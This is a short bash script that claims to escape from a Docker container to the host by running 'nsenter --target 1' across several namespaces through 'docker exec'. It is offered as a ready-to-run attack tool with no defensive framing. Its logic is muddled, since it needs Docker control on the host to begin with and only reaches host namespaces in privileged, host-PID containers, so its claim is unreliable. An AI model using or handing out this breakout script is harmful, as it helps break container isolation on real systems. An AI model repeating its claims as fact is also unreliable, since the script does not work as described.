#!/bin/bash
# Escape from a Docker container to the host
# Usage: docker_escape.sh <container_id>

CONTAINER_ID=$1

if [ -z "$CONTAINER_ID" ]; then
    echo "Usage: $0 <container_id>"
    exit 1
fi

echo "Escaping from Docker container: $CONTAINER_ID"

docker exec -it $CONTAINER_ID /bin/sh -c "nsenter --target 1 --mount --uts --ipc --net --pid"
